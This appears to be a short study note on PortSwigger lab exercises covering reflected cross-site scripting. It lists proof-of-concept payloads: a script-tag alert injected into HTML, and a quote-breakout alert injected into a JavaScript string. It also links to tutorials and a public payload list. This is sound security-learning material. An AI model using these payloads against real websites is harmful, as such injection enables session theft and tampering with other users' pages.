# Reflected XSS into HTML context with nothing encoded
![[Pasted image 20230224153715.png]]
`<script>alert("XSS")</script>`

# 

![[Pasted image 20230224153819.png]]

`<script>alert("XSS")</script>`


# Reflected XSS into a JavaScript string with angle brackets HTML encoded
![[Pasted image 20230224170640.png]]
escaping with single quote 
`xdd';alert('xss');'lmao`
![[Pasted image 20230224170455.png]]
![[Pasted image 20230224170818.png]]


---
Tags: #XSS #Stored_XSS #DOM-Based_XSS #Reflected_XSS
Resources:
[Reflected XSS portswigger](https://portswigger.net/web-security/cross-site-scripting/reflected)
[DOM-based XSS portswigger](https://portswigger.net/web-security/cross-site-scripting/dom-based)
[What is DOM-based](https://portswigger.net/web-security/dom-based)
[Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
[xss-payload-list](https://github.com/payloadbox/xss-payload-list)
